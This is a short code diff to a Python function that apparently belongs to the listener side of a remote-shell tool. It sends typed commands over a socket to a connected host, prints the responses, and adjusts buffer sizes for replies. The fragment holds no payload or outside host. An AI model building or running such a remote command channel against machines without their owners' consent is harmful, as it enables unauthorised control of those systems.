@@ -83,8 +83,13 @@ def send_commands(conn):
 
             elif len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
+                client_response = str(conn.recv(4096), "utf-8")
+                print(client_response, end="")
+            elif cmd == '':
                 client_response = str(conn.recv(10000000), "utf-8")
                 print(client_response, end="")
+                
+          
         except (ConnectionResetError, ConnectionAbortedError):
             print("Connection with host was lost")
             s.listen(1)
